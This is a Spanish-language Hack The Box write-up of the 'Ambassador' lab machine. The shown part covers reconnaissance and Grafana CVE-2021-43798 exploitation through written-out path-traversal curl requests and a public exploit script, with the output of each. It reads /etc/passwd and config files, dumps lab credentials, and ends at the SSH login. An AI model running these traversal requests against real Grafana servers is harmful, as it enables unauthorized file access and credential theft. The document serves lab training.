---
layout: single
title: Ambassador - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Ambassador de la plataforma de Hackthebox vamos a estar aprovechándonos de que la versión de Grafana que corre la maquina es vulnerable para leer archivos de la maquina y así poder obtener credenciales para conectarnos ala base de datos y obtener el hash de un usuario  y conectarnos por SSH para así enumerar un proyecto de Github y aprovecharnos de Hashicorp Consul para tener una shell como root"
date: 2023-06-12
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-ambassador/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Hashicorp Consul Exploitation
  - Github Project Enumeration
  - Grafana v8.2.0 Exploitation 
  - Database Enumeration MYSQL
---

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.11.183
PING 10.10.11.183 (10.10.11.183) 56(84) bytes of data.
64 bytes from 10.10.11.183: icmp_seq=1 ttl=63 time=114 ms

--- 10.10.11.183 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.586/113.586/113.586/0.000 ms
❯ whichSystem.py 10.10.11.183

10.10.11.183 (ttl -> 63): Linux

```

## PortScan

```bash
# Nmap 7.93 scan initiated Mon Jun 12 11:25:27 2023 as: nmap -sCV -p22,80,3000,3306 -oN targeted 10.10.11.183
Nmap scan report for 10.10.11.183
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Ambassador Development Server
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Hugo 0.94.2
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 12 Jun 2023 17:26:06 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 12 Jun 2023 17:25:33 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 12 Jun 2023 17:25:39 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsCompression, SupportsTransactions, IgnoreSigpipes, Support41Auth, SupportsLoadDataLocal, FoundRows, InteractiveClient, LongPassword, LongColumnFlag, ODBCClient, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: ?-\x04hk[u\x14\x1A\x1F<\x1Fb,U\x14tFHP
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=6/12%Time=6487550E%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Contro
SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
SF:ion:\x201;\x20mode=block\r\nDate:\x20Mon,\x2012\x20Jun\x202023\x2017:25
SF::33\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found<
SF:/a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mo
SF:n,\x2012\x20Jun\x202023\x2017:25:39\x20GMT\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
SF:\x20mode=block\r\nDate:\x20Mon,\x2012\x20Jun\x202023\x2017:26:06\x20GMT
SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 12 11:27:28 2023 -- 1 IP address (1 host up) scanned in 121.03 seconds

```

Con este escaneo vamos a indicar que queremos usar el **script** **http-enum** de **Nmap** para descubrir alguna ruta interesante en el servicio **web**

```bash
❯ nmap --script=http-enum -p80 10.10.11.183 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 11:29 CST
Nmap scan report for 10.10.11.183
Host is up (0.12s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 24.09 seconds
```

## Enumeracion

De momento no vemos ningún subdominio

```bash
❯ curl -s -I http://10.10.11.183
HTTP/1.1 200 OK
Date: Mon, 12 Jun 2023 17:31:30 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Fri, 02 Sep 2022 01:37:04 GMT
ETag: "e46-5e7a7c4652f79"
Accept-Ranges: bytes
Content-Length: 3654
Vary: Accept-Encoding
Content-Type: text/html
```

Ahora vamos a ver las tecnologías que corre el servicio web por el puerto **80**

```ruby
❯ whatweb http://10.10.11.183
http://10.10.11.183 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.183], MetaGenerator[Hugo 0.94.2], Open-Graph-Protocol[website], Title[Ambassador Development Server], X-UA-Compatible[IE=edge]
```

Esta es la pagina web 

![](/assets/images/htb-writeup-ambassador/web1.png)

Si revisamos la ruta que nos reporto **Nmap** vemos esto pero no es interesante

![](/assets/images/htb-writeup-ambassador/web2.png)

Si bajamos un poco mas en la pagina web vemos que si damos click nos lleva a esa ruta

![](/assets/images/htb-writeup-ambassador/web3.png)

Y bueno ya nos están dando información nos están diciendo que usemos la cuenta de **developer** para conectarnos por **SSH** y **DevOps** nos dará nuestra contraseña y pues bueno de momento ya sabemos que existe un usuario en la maquina con nombre **Developer**

![](/assets/images/htb-writeup-ambassador/web4.png)

Si vamos ala ruta **posts** solo vemos 1 que es el que acabamos de ver 

![](/assets/images/htb-writeup-ambassador/web5.png)

Bueno pues de momento podemos aplicar **Fuzzing** para descubrir nuevas cosas

```bash
❯ gobuster dir -u http://10.10.11.183/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x 20
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.183/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              20
[+] Timeout:                 10s
===============================================================
2023/06/12 11:39:39 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.11.183/images/]
/categories           (Status: 301) [Size: 317] [--> http://10.10.11.183/categories/]
/posts                (Status: 301) [Size: 312] [--> http://10.10.11.183/posts/]     
/tags                 (Status: 301) [Size: 311] [--> http://10.10.11.183/tags/]      
```

## Enumeracion 3000/tcp 

Bueno como no encontramos nada interesante podemos ver que el puerto `3000` hay un panel de **login** así que con esto ya podemos saber que hay un servicio **web** corriendo

```bash
❯ curl -s http://10.10.11.183:3000
<a href="/login">Found</a>.

```

Bueno vemos que se esta empleando un **Grafana** 

```ruby
❯ whatweb http://10.10.11.183:3000
http://10.10.11.183:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HttpOnly[redirect_to], IP[10.10.11.183], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
http://10.10.11.183:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.2.0], HTML5, IP[10.10.11.183], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

Esta es la pagina web 

![](/assets/images/htb-writeup-ambassador/web6.png)

Si buscamos credenciales por defecto vemos las típicas de **admin:admin**

![](/assets/images/htb-writeup-ambassador/web7.png)

Pero bueno si las probamos no son correctas

# CVE-2021-43798

Bueno estaba aplicando **Fuzzing** y pare el escaneo ya que hay una ruta que se llama **public** y bueno en una versión mas nueva de la que se esta usando en la versión **8.3.0** hay una vulnerabilidad la cual nos permite hacer un **directory traversal** <https://www.exploit-db.com/exploits/50581> podemos probar

```bash
❯ feroxbuster -t 200 -x php,txt,html -u http://10.10.11.183:3000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.183:3000
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, txt, html]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
WLD        2l        2w       29c Got 302 for http://10.10.11.183:3000/94c56dcb316640fca0ba1092864972bc (url length: 32)
WLD         -         -         - http://10.10.11.183:3000/94c56dcb316640fca0ba1092864972bc redirects to => /login
WLD         -         -         - Wildcard response is static; auto-filtering 29 responses; toggle this behavior by using --dont-filter
WLD        2l        2w       29c Got 302 for http://10.10.11.183:3000/67e3859f6fab45c8a8b78df12abba717e277c21955804166b09426be577da49d2f702841f49e46c1a7d591cc31adba33 (url length: 96)
WLD         -         -         - http://10.10.11.183:3000/67e3859f6fab45c8a8b78df12abba717e277c21955804166b09426be577da49d2f702841f49e46c1a7d591cc31adba33 redirects to => /login
401        1l        1w       27c http://10.10.11.183:3000/api
200      184l      690w        0c http://10.10.11.183:3000/login
401        1l        1w       27c http://10.10.11.183:3000/api.php
401        1l        1w       27c http://10.10.11.183:3000/api.txt
401        1l        1w       27c http://10.10.11.183:3000/api.html
302        2l        2w       31c http://10.10.11.183:3000/public
302        2l        2w       36c http://10.10.11.183:3000/public/test
302        2l        2w       40c http://10.10.11.183:3000/public/test/lib
302        2l        2w       35c http://10.10.11.183:3000/public/app
200      184l      690w        0c http://10.10.11.183:3000/signup
302        2l        2w       38c http://10.10.11.183:3000/public/emails
302        2l        2w       36c http://10.10.11.183:3000/public/maps
200        2l        4w       26c http://10.10.11.183:3000/robots.txt
```

Si probamos con el **exploit** vemos que si funciona pero también lo vamos a explotar manual

```bash
❯ python3 50581.py -H http://10.10.11.183:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false

Read file >
```

Esta vulnerabilidad es gracias a los **Plugins** que existen es por eso que tiene en el código definido una lista de **Plugins** para probar cual es valido entonces vamos a usar la herramienta **curl**

Si probamos con el primer **plugin** vemos que funciona

```bash
❯ curl -s -X GET 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd' --path-as-is
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
```

Bueno entonces como tenemos la capacidad de ver archivos de la maquina vamos a enumerar el sistema en busca de archivos interesantes

No podemos ver este archivo

```bash
❯ curl -s -X GET 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../proc/net/tcp' --path-as-is
seeker can't seek

```

No podemos ver 

```bash
❯ curl -s -X GET 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../proc/net/fib_trie' --path-as-is
seeker can't seek
```

Como sabemos que el usuario **developer** existe podemos ver si obtenemos su clave **id_rsa** para conectarnos por **SSH**, pero nos da un error

```bash
❯ curl -s -X GET 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../home/developer/.ssh/id_rsa' --path-as-is
{"message":"Could not open plugin file"}

```

Podemos listar procesos que estén corriendo en la maquina pero no nos deja

```bash
❯ curl -s -X GET 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../proc/sched_debug' --path-as-is
seeker can't seek
```

Si intentamos hacer un **Log Poisoning** no podremos por que no nos deja ver archivos con los cuales podamos ver los **logs** aunque se este corriendo **Apache2** 

```bash
❯ curl -s -X GET 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/log/apache2/access.log' --path-as-is
{"message":"Could not open plugin file"}
```

Bueno si vamos probando rutas pues no encontraremos nada interesante pero bueno me puse a buscar en github información para la versión de **Grafana** que se esta empleando y hay un repositorio donde se encuentran varias rutas entre ellas hay rutas donde involucra **grafana** <https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798/blob/main/paths.txt>

Si intentamos con este archivo funciona y encontramos credenciales para la base de datos ya que se esta corriendo **Mysql** que **Nmap** lo reporto en el escaneo

```bash
❯ curl -s -X GET 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini' --path-as-is

```

```bash
#################################### Database ####################################
[database]
# You can configure the database connection by specifying type, host, name, user and password
# as separate properties or as on string using the url properties.

# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =
```

En la parte de `Security` vemos esto 

```bash
#################################### Security ####################################
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm
```

Tenemos al parecer credenciales podemos probarlas para loguearnos en el panel de login de **Grafana** pero también podemos usar el **exploit** que encontramos en **Github** para ver si no se nos quedo algo pendiendo para enumerar <https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798>

```bash
❯ git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798
Clonando en 'exploit-grafana-CVE-2021-43798'...
remote: Enumerating objects: 25, done.
remote: Total 25 (delta 0), reused 0 (delta 0), pack-reused 25
Recibiendo objetos: 100% (25/25), 250.08 KiB | 455.00 KiB/s, listo.
Resolviendo deltas: 100% (9/9), listo.
❯ ls
 exploit-grafana-CVE-2021-43798
❯ cd exploit-grafana-CVE-2021-43798
```

Ahora tenemos que editar el archivo **targets.txt** para poder aplicar todo el ataque 

```bash
❯ catn targets.txt
http://10.10.11.183:3000

```

Ahora ejecutamos la herramienta y le pasamos el archivo 

```bash
❯ python3 exploit.py
  _____   _____   ___ __ ___ _     _ _ ________ ___ ___ 
 / __\ \ / / __|_|_  )  \_  ) |___| | |__ /__  / _ ( _ )
| (__ \ V /| _|___/ / () / /| |___|_  _|_ \ / /\_, / _ \
 \___| \_/ |___| /___\__/___|_|     |_|___//_/  /_/\___/
                @pedrohavay / @acassio22

? Enter the target list:  targets.txt

========================================

[i] Target: http://10.10.11.183:3000

[!] Payload "http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd" works.

[i] Analysing files...

[i] File "/conf/defaults.ini" found in server.
[*] File saved in "./http_10_10_11_183_3000/defaults.ini".

[i] File "/etc/grafana/grafana.ini" found in server.
[*] File saved in "./http_10_10_11_183_3000/grafana.ini".

[i] File "/etc/passwd" found in server.
[*] File saved in "./http_10_10_11_183_3000/passwd".

[i] File "/var/lib/grafana/grafana.db" found in server.
[*] File saved in "./http_10_10_11_183_3000/grafana.db".

[i] File "/proc/self/cmdline" found in server.
[*] File saved in "./http_10_10_11_183_3000/cmdline".

? Do you want to try to extract the passwords from the data source?  Yes

[i] Secret Key: SW2YcwTIb9zpOOhoPsMm

[*] Bye Bye!
```

Y bueno vemos que nos exporto un archivo **grafana.db**

```bash
❯ cd http_10_10_11_183_3000
❯ file *
cmdline:      empty
defaults.ini: UTF-8 Unicode text, with very long lines
grafana.db:   SQLite 3.x database, last written using SQLite version 3035004
grafana.ini:  UTF-8 Unicode text, with very long lines
passwd:       ASCII text
```

Nos podemos conectar con **sqlite3**, encontramos un hash

```bash
❯ sqlite3 grafana.db
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .table
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token           
sqlite> select * from user;
1|0|admin|admin@localhost||dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069|0X27trve2u|f960YdtaMF||1|1|0||2022-03-13 20:26:45|2022-09-01 22:39:38|0|2022-09-14 16:44:19|0
sqlite> 
```

Bueno si nos podemos a enumerar todas las tables vemos que esta tiene contenido interesante 

```bash
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-06-12 17:18:37|0|{}|1|uKewFgM4z
sqlite> 
```

Tenemos una contraseña para `mysql` **dontStandSoCloseToMe63221!** pero si recordamos nos decían esto **If the password contains # or ; you have to wrap it with triple quotes.** pero en este caso no aplica por la contraseña no tiene ninguno de esos caracteres y nos podemos conectar con esa contraseña 

```bash
❯ mysql -u 'grafana' -p -h 10.10.11.183
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 15
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 

```

Vemos las bases de datos

```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.122 sec)

MySQL [(none)]> 

```

Aquí vemos una tabla interesante para esa base de datos

```bash
MySQL [(none)]> use whackywidget
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.112 sec)

MySQL [whackywidget]> 
```

Tenemos 2 columnas

```bash
MySQL [whackywidget]> describe users;
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| user  | varchar(255) | YES  |     | NULL    |       |
| pass  | varchar(255) | YES  |     | NULL    |       |
+-------+--------------+------+-----+---------+-------+
2 rows in set (0.114 sec)

MySQL [whackywidget]> 

```

Y bueno tenemos el `hash` del usuario **developer**

```bash
MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.111 sec)

MySQL [whackywidget]> 
```

Y bueno esto básicamente es **Base64** 

```bash
❯ echo -n "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d; echo
anEnglishManInNewYork027468
```

Pero bueno podemos conectarnos también ala interfaz de grafana ya que también tenemos esta contraseña **messageInABottle685427** para el usuario admin que pudimos ver

Y funcionan

![](/assets/images/htb-writeup-ambassador/web8.png)

Pero bueno como tenemos la contraseña del usuario **developer** nos podemos conectar por **SSH** 

## Shell as developer 

`developer:anEnglishManInNewYork027468`

```bash
❯ ssh developer@10.10.11.183
The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.
ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.183' (ECDSA) to the list of known hosts.
developer@10.10.11.183's password: 
